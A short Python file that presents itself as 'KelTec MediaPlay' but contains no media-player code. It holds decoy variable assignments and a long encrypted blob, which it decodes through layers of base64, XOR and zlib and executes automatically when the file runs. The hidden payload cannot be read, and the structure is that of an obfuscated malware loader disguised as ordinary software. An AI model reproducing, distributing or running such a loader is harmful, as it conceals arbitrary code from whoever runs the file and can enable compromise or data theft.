# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 306775 ^ 845253
_lx1_1 = len("d30504")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-583788)
_lx3_3 = 515743 * 0
_lx4_4 = 474055 ^ 285587
_K = 'be744e98ac938906a2e720c6c916cefac60129b6019534c2e6522a7b1f52b8c5'
_M = 'uDw5s6WjGiWcG5aWynaydmAp8OkXSDM01dev+GNGJajyOCno56QTKZFPyMDJK+FyMSqr7kpIbDTTi6n+OhFx/fZsK+nl8xB8khqV'
_D = '==gpfxi5+B+OrTgB4RhNAo8711IDeQIoAaYGmvKRJD8QodXtT6pm4fzIgKkuTuUMd0XFq147yk8wZ3QPxJxmfE+Gbt81fNr8EdOc5U9VtSQanpouFSB4hZL7kY6FY6e7sGyWixQ0WqupcbrTZFOD0numDZIfOv74FE62jRNZTgb5Rd3fSUZSm0E7Tz4l81L2GytOnfREVMTTSsC2YoXPEDRF0crL+etjSTyhCUMXtzWsk8FeqcEgXnZoUN3hgzMJQyFNi/l1K3LUQnDoS+5tClRyJIbYAJRwk+nQiJag2SDQhjkNiuh0P2YyrchYe+7V6/v0/04fEI399j8s3pr/s/GZAuL4ppkiFS40SXuSEy4DwlJF9SNbC7/l6X0YJAgjJaGIPKC3u2hYaungqJl7UIgE8LJSPJ2lRX2rgOBWdkd9NfCiEzPAaMf0PXjEvN1PnItjJg/D2CtDkbxDucXJRcHMbG8/yGbwl6Wt1ukBClhsRSafcO7ahAko9NqVbM9RUoO7JnnaLJ4eO5EtMq9I1wWy46Wx/l9AfY+DGuoc/OqKlCbznv5YhpKGK8HaO+uliKVgf/8SrzKt4dIrrHlPPygSx4Jh6bkYH3I4FjxJgS7cqRnbCnWlgW57KFfEhC2dQ2MC/NZUMPECe9XOHxbF5F6At6+EZ8r7fpL0ModfZXIFYOVPEHQJVhdCiyiolGQIE+plRN7k4GUZ5fFmtLIFMnJz7PaS8cx1yv+FSJ+UfdwkRV2/kWLwQiUw+Lc+/A7biU1VkKxSyvrg4xDwTeyV/D6rjnoeh3PsuT0zdGvdbWVUVW9bIrf1721aCMtpUn3VjO0wIgaaamV7JWgFeWLqvkDey1udckseCG1+/qh1uA4Iwc1D7TW7j6EeqgNtecldOYYiOOw2VrmxawaRUX7Gdh7D4DqpvIbW52B2qWqWafb5NtPCHN4JOZoRdmtcOYpg28CsO+OYxQF5+QJC0+996uuVIaHreF0gLXl5tBAlgqdwLfMlwKf8M9Z6V5Y3eeIYIwNaRD8igjLlNv2ijvtXiO60me6JwSLbvADPNQr83alij8s1kMQb/l6+cxFKt2fNhDgIBfTMgCbL7FV0B3Wp83PIz+ZaTDgVPUuwm2UPIyqmms0NV7YoqMf1r8CHgtmCpz4b3hqf0AjrLkbf7CqzRSNh2bwJE4xZjiDBbdHsMHS7zYv46LLA47pA5syRH925ihEVPjqTK0plK3ttBNzAd/eqwDh0B2gY04FxM62xtAoVlA0X6bw7K3JbDk5cAHzJMNVSSKc1Mw07dQclglUrnsrKp0CaTfd6MExLn1ytD8CBCNvJMJbaGXZ3CeqW3zlGStTjABjkWSMRVmZVyJzLsntpoyWiCbGg9wl3sKIwvTjPlM943WMwLl9zDBefa1yj3cTpfJpS61TBVElI06QNJdNdIyYO6HUacL0F+Twnp7H3O6xyaPvOM2MGe2mIL/AauSG7Og5nZwfJTPQ10/yM0bwhoKpYQ1Fox9hI3cekWWVdtt20SronXtjNhYnPGHgDWtBMXKJlHTW8ZM3eTYli5L/zdkrm4zkSYfBeSsMmGiud+/KoPsUxbN+girX3CPs+NoNySYj664BZK3mhZnosQuh9kAGej3F0zQnUbPGvMMXGHcuD/TJE6VSRRwfLvsl1HSI805bJuANZXeW5RulaEGdrR/dmHCNCtmbyqJUbVizO7w7PFjoHjFkhp57+FA9SGyFceb+N+4dsg8gYi84HU66YUpmeMc+wSFkOmtJXxTVmNOVqeZnNLd7a/O+rw+BJbIoY78LZXhnTMPe65wO+SqnVXydnQIRwo7lr/ThARbLrqGiwFyoCrGY3Vd+/F4vuuc5XwB1U1aqQVje0n3jj'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()